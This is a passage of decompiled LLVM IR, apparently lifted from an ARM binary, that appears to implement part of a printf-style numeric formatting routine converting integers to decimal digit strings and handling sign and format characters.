bb249:                                            ; preds = %bb247, %bb248
  br i1 %v3_146fc, label %bb250, label %bb251

bb250:                                            ; preds = %bb249
  %v5_14704 = add i32 %v4_14704154159, 2
  store i32 %v5_14704, i32* %r2.global-to-local, align 4
  br label %bb251

bb251:                                            ; preds = %bb249, %bb250
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1470c = load i32, i32* %sl.global-to-local, align 4
  %v1_1470c = add i32 %v0_1470c, -103
  %v3_1470c = sub i32 102, %v0_1470c
  %v4_1470c = and i32 %v3_1470c, %v0_1470c
  %v5_1470c = icmp slt i32 %v4_1470c, 0
  store i1 %v5_1470c, i1* %cpsr_v.global-to-local, align 1
  %v6_1470c = icmp slt i32 %v1_1470c, 0
  store i1 %v6_1470c, i1* %cpsr_n.global-to-local, align 1
  %v7_1470c = icmp eq i32 %v0_1470c, 103
  store i1 %v7_1470c, i1* %cpsr_z.global-to-local, align 1
  %v3_14710 = add i32 %v2_14710, 1
  %v4_14710 = inttoptr i32 %v3_14710 to i8*
  store i8 0, i8* %v4_14710, align 1
  %v0_14714 = load i32, i32* %r1.global-to-local, align 4
  %v1_14714 = add i32 %v0_14714, 1
  store i32 %v1_14714, i32* %r1.global-to-local, align 4
  %v0_14718 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14718, label %dec_label_pc_1471c, label %dec_label_pc_1474c

dec_label_pc_1471c:                               ; preds = %bb251
  %v0_1471c = load i32, i32* %r0.global-to-local, align 4
  %v1_1471c = load i32, i32* %ip.global-to-local, align 4
  %v2_1471c = sub i32 %v0_1471c, %v1_1471c
  %v4_1471c = xor i32 %v1_1471c, %v0_1471c
  %v5_1471c = xor i32 %v2_1471c, %v0_1471c
  %v6_1471c = and i32 %v5_1471c, %v4_1471c
  %v7_1471c = icmp slt i32 %v6_1471c, 0
  %v8_1471c = icmp slt i32 %v2_1471c, 0
  %v9_1471c = icmp eq i32 %v0_1471c, %v1_1471c
  %v3_14720 = xor i1 %v8_1471c, %v7_1471c
  %v4_14720 = or i1 %v9_1471c, %v3_14720
  %.273 = zext i1 %v4_14720 to i32
  store i32 %.273, i32* %r3.global-to-local, align 4
  %v1_14728 = add i32 %v0_1471c, 4
  %v3_14728 = sub i32 0, %v0_1471c
  %v4_14728 = and i32 %v1_14728, %v3_14728
  %v5_14728 = icmp slt i32 %v4_14728, 0
  store i1 %v5_14728, i1* %cpsr_v.global-to-local, align 1
  %v6_14728 = icmp slt i32 %v1_14728, 0
  store i1 %v6_14728, i1* %cpsr_n.global-to-local, align 1
  %v7_14728 = icmp eq i32 %v1_14728, 0
  store i1 %v7_14728, i1* %cpsr_z.global-to-local, align 1
  %v2_1472c = xor i1 %v6_14728, %v5_14728
  br i1 %v2_1472c, label %.thread21, label %bb254

.thread21:                                        ; preds = %dec_label_pc_1471c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread165

bb254:                                            ; preds = %dec_label_pc_1471c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14730 = icmp eq i1 %v4_14720, false
  store i1 %v2_14730, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14730, label %.thread165, label %bb255

.thread165:                                       ; preds = %bb254, %.thread21
  %v1_147383551 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_147383551, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14758

bb255:                                            ; preds = %bb254
  %v3_14734 = sub i32 %v1_1471c, %v0_1471c
  store i32 %v3_14734, i32* %ip.global-to-local, align 4
  store i32 102, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14764

dec_label_pc_1474c:                               ; preds = %bb251
  %v0_1474c = load i32, i32* %sl.global-to-local, align 4
  %v1_1474c = add i32 %v0_1474c, -102
  %v3_1474c = sub i32 101, %v0_1474c
  %v4_1474c = and i32 %v3_1474c, %v0_1474c
  %v5_1474c = icmp slt i32 %v4_1474c, 0
  store i1 %v5_1474c, i1* %cpsr_v.global-to-local, align 1
  %v6_1474c = icmp slt i32 %v1_1474c, 0
  store i1 %v6_1474c, i1* %cpsr_n.global-to-local, align 1
  %v7_1474c = icmp eq i32 %v0_1474c, 102
  store i1 %v7_1474c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1474c, i32* %r7.global-to-local, align 4
  br i1 %v7_1474c, label %dec_label_pc_1474c.dec_label_pc_14764_crit_edge, label %dec_label_pc_14758

dec_label_pc_1474c.dec_label_pc_14764_crit_edge:  ; preds = %dec_label_pc_1474c
  %v0_14764.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14764

dec_label_pc_14758:                               ; preds = %.thread165, %dec_label_pc_1474c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14774

dec_label_pc_14764:                               ; preds = %bb255, %dec_label_pc_1474c.dec_label_pc_14764_crit_edge
  %v0_14764 = phi i32 [ %v0_1471c, %bb255 ], [ %v0_14764.pre, %dec_label_pc_1474c.dec_label_pc_14764_crit_edge ]
  %stack_var_-184.3 = phi i32 [ %v3_14734, %bb255 ], [ %v0_1463c, %dec_label_pc_1474c.dec_label_pc_14764_crit_edge ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14764 = icmp slt i32 %v0_14764, 0
  store i1 %v1_14764, i1* %cpsr_n.global-to-local, align 1
  %v2_14764 = icmp eq i32 %v0_14764, 0
  store i1 %v2_14764, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_14764, label %bb256, label %bb257

bb256:                                            ; preds = %dec_label_pc_14764
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_1476c = load i32, i32* %r2.global-to-local, align 4
  %v6_1476c = add i32 %v5_1476c, -1
  %v7_1476c = inttoptr i32 %v6_1476c to i8*
  store i8 48, i8* %v7_1476c, align 1
  %v8_1476c = load i32, i32* %r2.global-to-local, align 4
  %v9_1476c = add i32 %v8_1476c, -1
  store i32 %v9_1476c, i32* %r2.global-to-local, align 4
  %v0_14770.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_147a0.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_147a4.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_147a4.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb257

bb257:                                            ; preds = %dec_label_pc_14764, %bb256
  %v1_147a4.pre = phi i1 [ %v1_147a4.pre.pre, %bb256 ], [ false, %dec_label_pc_14764 ]
  %v0_147a4.pre = phi i1 [ %v0_147a4.pre.pre, %bb256 ], [ false, %dec_label_pc_14764 ]
  %v1_147a0.pre = phi i32 [ %v1_147a0.pre.pre, %bb256 ], [ %v1_14714, %dec_label_pc_14764 ]
  %v0_14770 = phi i32 [ %v0_14770.pre, %bb256 ], [ %v0_14764, %dec_label_pc_14764 ]
  store i32 %v0_14770, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14774

dec_label_pc_14774:                               ; preds = %dec_label_pc_14758, %bb257
  %v0_1480c = phi i32 [ 0, %dec_label_pc_14758 ], [ %v0_14770, %bb257 ]
  %v1_147a8 = phi i1 [ false, %dec_label_pc_14758 ], [ %v1_147a4.pre, %bb257 ]
  %v0_147a8 = phi i1 [ false, %dec_label_pc_14758 ], [ %v0_147a4.pre, %bb257 ]
  %v1_147a0 = phi i32 [ %v1_14714, %dec_label_pc_14758 ], [ %v1_147a0.pre, %bb257 ]
  %v1_148c8 = phi i32 [ %v0_1463c, %dec_label_pc_14758 ], [ %stack_var_-184.3, %bb257 ]
  store i32 1, i32* %stack_var_-160, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_14780 = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_14780, i32* %r3.global-to-local, align 4
  %v0_1478c = load i32, i32* %r2.global-to-local, align 4
  %v1_1478c = inttoptr i32 %v0_1478c to i8*
  %v2_1478c = load i8, i8* %v1_1478c, align 1
  %v3_1478c = zext i8 %v2_1478c to i32
  store i32 %v3_1478c, i32* %r3.global-to-local, align 4
  %v5_1478c = add i32 %v0_1478c, 1
  store i32 %v5_1478c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_1478c, i32* %stack_var_-38, align 4
  %v2_147a0 = sub i32 %v1_147a0, %v5_1478c
  store i32 %v2_147a0, i32* %r1.global-to-local, align 4
  %v2_147a4 = xor i1 %v1_147a8, %v0_147a8
  br i1 %v2_147a4, label %.thread167, label %dec_label_pc_147ac

.thread167:                                       ; preds = %dec_label_pc_14774
  %v5_147a4 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v5_147a4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1481c

dec_label_pc_147ac:                               ; preds = %dec_label_pc_14774
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_147b0 = sub i32 %v0_1480c, %v2_147a0
  %v4_147b0 = xor i32 %v2_147a0, %v0_1480c
  %v5_147b0 = xor i32 %v2_147b0, %v0_1480c
  %v6_147b0 = and i32 %v5_147b0, %v4_147b0
  %v7_147b0 = icmp slt i32 %v6_147b0, 0
  store i1 %v7_147b0, i1* %cpsr_v.global-to-local, align 1
  %v8_147b0 = icmp slt i32 %v2_147b0, 0
  store i1 %v8_147b0, i1* %cpsr_n.global-to-local, align 1
  %v9_147b0 = icmp eq i32 %v0_1480c, %v2_147a0
  store i1 %v9_147b0, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-152, align 4
  %v2_147bc = xor i1 %v8_147b0, %v7_147b0
  br i1 %v2_147bc, label %dec_label_pc_147f8, label %dec_label_pc_147c0

dec_label_pc_147c0:                               ; preds = %dec_label_pc_147ac
  store i32 %v2_147b0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_147b0, i1* %cpsr_n.global-to-local, align 1
  %v2_147c4 = icmp eq i32 %v2_147b0, 0
  store i1 %v2_147c4, i1* %cpsr_z.global-to-local, align 1
  %v2_147cc = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_147cc, i32* %lr.global-to-local, align 4
  %tmp258 = icmp slt i32 %v2_147b0, 1
  br i1 %tmp258, label %.thread169, label %dec_label_pc_147d8

.thread169:                                       ; preds = %dec_label_pc_147c0
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14818

dec_label_pc_147d8:                               ; preds = %dec_label_pc_147c0
  store i32 ptrtoint (i32* @global_var_1ae5b.574 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_147e4 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_147e4, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-140, align 4
  br label %dec_label_pc_1481c

dec_label_pc_147f8:                               ; preds = %dec_label_pc_147ac
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_147f8 = icmp slt i32 %v0_1480c, 0
  store i1 %v1_147f8, i1* %cpsr_n.global-to-local, align 1
  %v2_147f8 = icmp eq i32 %v0_1480c, 0
  store i1 %v2_147f8, i1* %cpsr_z.global-to-local, align 1
  %v2_147fc = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_147fc, i32* %lr.global-to-local, align 4
  %tmp259 = icmp slt i32 %v0_1480c, 1
  br i1 %tmp259, label %dec_label_pc_14818, label %dec_label_pc_14808

dec_label_pc_14808:                               ; preds = %dec_label_pc_147f8
  %v2_1480c = sub i32 %v2_147a0, %v0_1480c
  store i32 %v2_1480c, i32* %r1.global-to-local, align 4
  %v2_14810 = add i32 %v5_1478c, %v0_1480c
  store i32 %v2_14810, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14818

dec_label_pc_14818:                               ; preds = %dec_label_pc_14808, %.thread169, %dec_label_pc_147f8
  %storemerge181.in = phi i32* [ %stack_var_-152, %dec_label_pc_147f8 ], [ %stack_var_-140, %.thread169 ], [ %stack_var_-140, %dec_label_pc_14808 ]
  %v0_14830102 = phi i32 [ %v2_147a0, %dec_label_pc_147f8 ], [ 0, %.thread169 ], [ %v2_1480c, %dec_label_pc_14808 ]
  %storemerge181 = ptrtoint i32* %storemerge181.in to i32
  store i32 %storemerge181, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1481c

dec_label_pc_1481c:                               ; preds = %.thread167, %dec_label_pc_147d8, %dec_label_pc_14818
  %v1_14854 = phi i32 [ %v2_147e4, %dec_label_pc_147d8 ], [ %storemerge181, %dec_label_pc_14818 ], [ %v5_147a4, %.thread167 ]
  %v0_1486c110 = phi i32 [ -1, %dec_label_pc_147d8 ], [ -1, %dec_label_pc_14818 ], [ %v0_1480c, %.thread167 ]
  %v0_14830 = phi i32 [ 0, %dec_label_pc_147d8 ], [ %v0_14830102, %dec_label_pc_14818 ], [ %v2_147a0, %.thread167 ]
  %v2_1481c = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_1481c, i32* %r2.global-to-local, align 4
  %v1_14820 = add i32 %v2_1481c, 12
  %v2_14820 = inttoptr i32 %v1_14820 to i32*
  %v3_14820 = load i32, i32* %v2_14820, align 4
  %v1_14824 = and i32 %v3_14820, 16
  store i32 %v1_14824, i32* %lr.global-to-local, align 4
  %v2_14824 = icmp eq i32 %v1_14824, 0
  %tmp282 = zext i1 %v2_14824 to i32
  %.274 = xor i32 %tmp282, 1
  store i32 %.274, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14830 = icmp slt i32 %v0_14830, 0
  store i1 %v1_14830, i1* %cpsr_n.global-to-local, align 1
  %v2_14830 = icmp eq i32 %v0_14830, 0
  store i1 %v2_14830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14830, label %bb262, label %.thread40

.thread40:                                        ; preds = %dec_label_pc_1481c
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14850

bb262:                                            ; preds = %dec_label_pc_1481c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_14824, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14824, label %dec_label_pc_14840, label %dec_label_pc_14850

dec_label_pc_14840:                               ; preds = %bb262
  store i32 %v1_148c8, i32* %r3.global-to-local, align 4
  %v0_14844 = load i32, i32* %sl.global-to-local, align 4
  %v1_14844 = add i32 %v0_14844, -103
  %v3_14844 = sub i32 102, %v0_14844
  %v4_14844 = and i32 %v3_14844, %v0_14844
  %v5_14844 = icmp slt i32 %v4_14844, 0
  store i1 %v5_14844, i1* %cpsr_v.global-to-local, align 1
  %v6_14844 = icmp slt i32 %v1_14844, 0
  store i1 %v6_14844, i1* %cpsr_n.global-to-local, align 1
  %v7_14844 = icmp eq i32 %v0_14844, 103
  store i1 %v7_14844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14844, label %dec_label_pc_1486c, label %bb263

bb263:                                            ; preds = %dec_label_pc_14840
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_14848 = icmp slt i32 %v1_148c8, 0
  store i1 %v2_14848, i1* %cpsr_n.global-to-local, align 1
  %v3_14848 = icmp eq i32 %v1_148c8, 0
  store i1 %v3_14848, i1* %cpsr_z.global-to-local, align 1
  %tmp264 = icmp slt i32 %v1_148c8, 1
  br i1 %tmp264, label %dec_label_pc_1486c, label %dec_label_pc_14850

dec_label_pc_14850:                               ; preds = %.thread40, %bb262, %bb263
  %v2_14854 = inttoptr i32 %v1_14854 to i32*
  store i32 112, i32* %v2_14854, align 4
  %v1_1485c = load i32, i32* %r6.global-to-local, align 4
  %v2_1485c = add i32 %v1_1485c, 4
  %v3_1485c = inttoptr i32 %v2_1485c to i32*
  store i32 1, i32* %v3_1485c, align 4
  store i32 ptrtoint (i32* @global_var_1ae68.576 to i32), i32* %r3.global-to-local, align 4
  %v1_14864 = load i32, i32* %r6.global-to-local, align 4
  %v2_14864 = add i32 %v1_14864, 8
  %v3_14864 = inttoptr i32 %v2_14864 to i32*
  store i32 ptrtoint (i32* @global_var_1ae68.576 to i32), i32* %v3_14864, align 4
  %v0_14868 = load i32, i32* %r6.global-to-local, align 4
  %v1_14868 = add i32 %v0_14868, 12
  store i32 %v1_14868, i32* %r6.global-to-local, align 4
  %v0_1486c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1486c

dec_label_pc_1486c:                               ; preds = %dec_label_pc_14840, %bb263, %dec_label_pc_14850
  %v1_14878 = phi i32 [ %v1_14854, %bb263 ], [ %v1_14868, %dec_label_pc_14850 ], [ %v1_14854, %dec_label_pc_14840 ]
  %v0_1486c = phi i32 [ %v0_1486c110, %bb263 ], [ %v0_1486c.pre, %dec_label_pc_14850 ], [ %v0_1486c110, %dec_label_pc_14840 ]
  %v1_1486c = add i32 %v0_1486c, 1
  store i32 %v1_1486c, i32* %ip.global-to-local, align 4
  %v3_1486c = sub i32 0, %v0_1486c
  %v4_1486c = and i32 %v1_1486c, %v3_1486c
  %v5_1486c = icmp slt i32 %v4_1486c, 0
  store i1 %v5_1486c, i1* %cpsr_v.global-to-local, align 1
  %v6_1486c = icmp slt i32 %v1_1486c, 0
  store i1 %v6_1486c, i1* %cpsr_n.global-to-local, align 1
  %v7_1486c = icmp eq i32 %v1_1486c, 0
  store i1 %v7_1486c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1486c, label %dec_label_pc_14890, label %dec_label_pc_14874

dec_label_pc_14874:                               ; preds = %dec_label_pc_1486c
  %v1_14874 = sub i32 -1, %v0_1486c
  %v2_14878 = add i32 %v1_14878, 4
  %v3_14878 = inttoptr i32 %v2_14878 to i32*
  store i32 %v1_14874, i32* %v3_14878, align 4
  store i32 ptrtoint (i32* @global_var_1ae5b.574 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_14884 = load i32, i32* %r6.global-to-local, align 4
  %v2_14884 = inttoptr i32 %v1_14884 to i32*
  store i32 176, i32* %v2_14884, align 4
  %v0_14888 = load i32, i32* %r3.global-to-local, align 4
  %v1_14888 = load i32, i32* %r6.global-to-local, align 4
  %v2_14888 = add i32 %v1_14888, 8
  %v3_14888 = inttoptr i32 %v2_14888 to i32*
  store i32 %v0_14888, i32* %v3_14888, align 4
  %v0_1488c = load i32, i32* %r6.global-to-local, align 4
  %v1_1488c = add i32 %v0_1488c, 12
  store i32 %v1_1488c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14890

dec_label_pc_14890:                               ; preds = %dec_label_pc_1486c, %dec_label_pc_14874
  %v2_14898 = phi i32 [ %v1_14878, %dec_label_pc_1486c ], [ %v1_1488c, %dec_label_pc_14874 ]
  %v0_14890 = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14890 = icmp slt i32 %v0_14890, 0
  store i1 %v1_14890, i1* %cpsr_n.global-to-local, align 1
  %v2_14890 = icmp eq i32 %v0_14890, 0
  store i1 %v2_14890, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14890, label %.thread49, label %bb265

bb265:                                            ; preds = %dec_label_pc_14890
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_14898 = inttoptr i32 %v2_14898 to i32*
  store i32 112, i32* %v3_14898, align 4
  %v1_1489c = load i32, i32* %r4.global-to-local, align 4
  %v2_1489c = load i32, i32* %r6.global-to-local, align 4
  %v3_1489c = add i32 %v2_1489c, 8
  %v4_1489c = inttoptr i32 %v3_1489c to i32*
  store i32 %v1_1489c, i32* %v4_1489c, align 4
  %v1_148a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_148a0 = load i32, i32* %r6.global-to-local, align 4
  %v3_148a0 = add i32 %v2_148a0, 4
  %v4_148a0 = inttoptr i32 %v3_148a0 to i32*
  store i32 %v1_148a0, i32* %v4_148a0, align 4
  %v1_148a4 = load i32, i32* %r6.global-to-local, align 4
  %v2_148a4 = add i32 %v1_148a4, 12
  store i32 %v2_148a4, i32* %r6.global-to-local, align 4
  br label %.thread49

.thread49:                                        ; preds = %dec_label_pc_14890, %bb265
  %v1_148cc = phi i32 [ %v2_14898, %dec_label_pc_14890 ], [ %v2_148a4, %bb265 ]
  %v0_148a8 = load i32, i32* %sl.global-to-local, align 4
  %v1_148a8 = add i32 %v0_148a8, -103
  %v3_148a8 = sub i32 102, %v0_148a8
  %v4_148a8 = and i32 %v3_148a8, %v0_148a8
  %v5_148a8 = icmp slt i32 %v4_148a8, 0
  store i1 %v5_148a8, i1* %cpsr_v.global-to-local, align 1
  %v6_148a8 = icmp slt i32 %v1_148a8, 0
  store i1 %v6_148a8, i1* %cpsr_n.global-to-local, align 1
  %v7_148a8 = icmp eq i32 %v0_148a8, 103
  store i1 %v7_148a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_148a8, label %dec_label_pc_148b0, label %dec_label_pc_148b8

dec_label_pc_148b0:                               ; preds = %.thread49
  %v0_148b0 = load i32, i32* %lr.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_148b0 = icmp slt i32 %v0_148b0, 0
  store i1 %v1_148b0, i1* %cpsr_n.global-to-local, align 1
  %v2_148b0 = icmp eq i32 %v0_148b0, 0
  store i1 %v2_148b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_148b0, label %dec_label_pc_148e4, label %dec_label_pc_148b8

dec_label_pc_148b8:                               ; preds = %.thread49, %dec_label_pc_148b0
  %v0_148b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_148b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_148b8 = sub i32 %v1_148b8, %v0_148b8
  store i32 %v2_148b8, i32* %r3.global-to-local, align 4
  store i32 %v1_148c8, i32* %ip.global-to-local, align 4
  %v2_148c0 = sub i32 %v2_148b8, %v1_148c8
  %v4_148c0 = xor i32 %v2_148b8, %v1_148c8
  %v5_148c0 = xor i32 %v2_148c0, %v2_148b8
  %v6_148c0 = and i32 %v5_148c0, %v4_148c0
  %v7_148c0 = icmp slt i32 %v6_148c0, 0
  store i1 %v7_148c0, i1* %cpsr_v.global-to-local, align 1
  %v8_148c0 = icmp slt i32 %v2_148c0, 0
  store i1 %v8_148c0, i1* %cpsr_n.global-to-local, align 1
  %v9_148c0 = icmp eq i32 %v2_148b8, %v1_148c8
  store i1 %v9_148c0, i1* %cpsr_z.global-to-local, align 1
  %v2_148c4 = xor i1 %v8_148c0, %v7_148c0
  br i1 %v2_148c4, label %dec_label_pc_148c8, label %dec_label_pc_148e4

dec_label_pc_148c8:                               ; preds = %dec_label_pc_148b8
  %v2_148c8 = sub i32 %v1_148c8, %v2_148b8
  %v2_148cc = add i32 %v1_148cc, 4
  %v3_148cc = inttoptr i32 %v2_148cc to i32*
  store i32 %v2_148c8, i32* %v3_148cc, align 4
  store i32 ptrtoint (i32* @global_var_1ae5b.574 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_148d8 = load i32, i32* %r6.global-to-local, align 4
  %v2_148d8 = inttoptr i32 %v1_148d8 to i32*
  store i32 176, i32* %v2_148d8, align 4
  %v0_148dc = load i32, i32* %r3.global-to-local, align 4
  %v1_148dc = load i32, i32* %r6.global-to-local, align 4
  %v2_148dc = add i32 %v1_148dc, 8
  %v3_148dc = inttoptr i32 %v2_148dc to i32*
  store i32 %v0_148dc, i32* %v3_148dc, align 4
  %v0_148e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_148e0 = add i32 %v0_148e0, 12
  store i32 %v1_148e0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_148e4

dec_label_pc_148e4:                               ; preds = %dec_label_pc_148b8, %dec_label_pc_148b0, %dec_label_pc_148c8
  %v1_14978.pre.pre = phi i32 [ %v1_148cc, %dec_label_pc_148b8 ], [ %v1_148cc, %dec_label_pc_148b0 ], [ %v1_148e0, %dec_label_pc_148c8 ]
  %v0_148e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_148e4 = add i32 %v0_148e4, -102
  %v3_148e4 = sub i32 101, %v0_148e4
  %v4_148e4 = and i32 %v3_148e4, %v0_148e4
  %v5_148e4 = icmp slt i32 %v4_148e4, 0
  store i1 %v5_148e4, i1* %cpsr_v.global-to-local, align 1
  %v6_148e4 = icmp slt i32 %v1_148e4, 0
  store i1 %v6_148e4, i1* %cpsr_n.global-to-local, align 1
  %v7_148e4 = icmp eq i32 %v0_148e4, 102
  store i1 %v7_148e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_148e4, label %dec_label_pc_1496c, label %dec_label_pc_148ec

dec_label_pc_148ec:                               ; preds = %dec_label_pc_148e4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_148f0 = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_148f0 = icmp slt i32 %v0_148f0, 0
  store i1 %v1_148f0, i1* %cpsr_n.global-to-local, align 1
  %v2_148f0 = icmp eq i32 %v0_148f0, 0
  store i1 %v2_148f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %stack_var_-58.0131138, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-43, align 4
  %v4_14904 = sub i32 0, %v0_148f0
  %storemerge180 = select i1 %v1_148f0, i32 %v4_14904, i32 %v0_148f0
  %tmp283 = ashr i32 %v0_148f0, 31
  %tmp284 = and i32 %tmp283, 2
  %tmp285 = add nuw nsw i32 %tmp284, 43
  store i32 %storemerge180, i32* %r4.global-to-local, align 4
  store i32 %tmp285, i32* %sl.global-to-local, align 4
  %v2_1490c = ptrtoint i32* %stack_var_-43 to i32
  store i32 %v2_1490c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14914

dec_label_pc_14914:                               ; preds = %dec_label_pc_14944, %dec_label_pc_14914, %dec_label_pc_148ec
  %v2_1492c = phi i32 [ %v2_1490c, %dec_label_pc_148ec ], [ %v6_1492c, %dec_label_pc_14914 ], [ %v6_1492c, %dec_label_pc_14944 ]
  %v0_14928 = phi i32 [ %storemerge180, %dec_label_pc_148ec ], [ %v2_14930, %dec_label_pc_14914 ], [ %v2_14930, %dec_label_pc_14944 ]
  %v2_1491c = srem i32 %v0_14928, 10
  %v1_14920 = add nsw i32 %v2_1491c, 48
  store i32 %v1_14920, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_14928, i32* %r0.global-to-local, align 4
  %v1_1492c = trunc i32 %v1_14920 to i8
  %v3_1492c = add i32 %v2_1492c, -1
  %v4_1492c = inttoptr i32 %v3_1492c to i8*
  store i8 %v1_1492c, i8* %v4_1492c, align 1
  %v5_1492c = load i32, i32* %r5.global-to-local, align 4
  %v6_1492c = add i32 %v5_1492c, -1
  store i32 %v6_1492c, i32* %r5.global-to-local, align 4
  %v0_14930 = load i32, i32* %r0.global-to-local, align 4
  %v1_14930 = load i32, i32* %r1.global-to-local, align 4
  %v2_14930 = sdiv i32 %v0_14930, %v1_14930
  store i32 %v2_14930, i32* %r0.global-to-local, align 4
  %v0_14934 = load i32, i32* %r7.global-to-local, align 4
  %v1_14934 = add i32 %v0_14934, 1
  store i32 %v1_14934, i32* %r7.global-to-local, align 4
  %v1_14938 = add i32 %v0_14934, -2
  %v3_14938 = sub i32 1, %v0_14934
  %v4_14938 = and i32 %v3_14938, %v1_14934
  %v5_14938 = icmp slt i32 %v4_14938, 0
  store i1 %v5_14938, i1* %cpsr_v.global-to-local, align 1
  %v6_14938 = icmp slt i32 %v1_14938, 0
  store i1 %v6_14938, i1* %cpsr_n.global-to-local, align 1
  %v7_14938 = icmp eq i32 %v1_14934, 3
  store i1 %v7_14938, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_14930, i32* %r4.global-to-local, align 4
  %v7_14940 = icmp slt i32 %v1_14934, 4
  br i1 %v7_14940, label %dec_label_pc_14914, label %dec_label_pc_14944

dec_label_pc_14944:                               ; preds = %dec_label_pc_14914
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14944 = icmp slt i32 %v2_14930, 0
  store i1 %v1_14944, i1* %cpsr_n.global-to-local, align 1
  %v2_14944 = icmp eq i32 %v2_14930, 0
  store i1 %v2_14944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14944, label %dec_label_pc_1494c, label %dec_label_pc_14914

dec_label_pc_1494c:                               ; preds = %dec_label_pc_14944
  %v1_1494c = add i32 %v5_1492c, -2
  store i32 %v1_1494c, i32* %r3.global-to-local, align 4
  %v0_14950 = load i32, i32* %sl.global-to-local, align 4
  %v1_14950 = trunc i32 %v0_14950 to i8
  %v4_14950 = inttoptr i32 %v1_1494c to i8*
  store i8 %v1_14950, i8* %v4_14950, align 1
  %v0_14954 = load i32, i32* %r3.global-to-local, align 4
  %v1_14954 = add i32 %v0_14954, -1
  store i32 %v1_14954, i32* %r2.global-to-local, align 4
  %v0_14958 = load i32, i32* %r8.global-to-local, align 4
  %v1_14958 = trunc i32 %v0_14958 to i8
  %v4_14958 = inttoptr i32 %v1_14954 to i8*
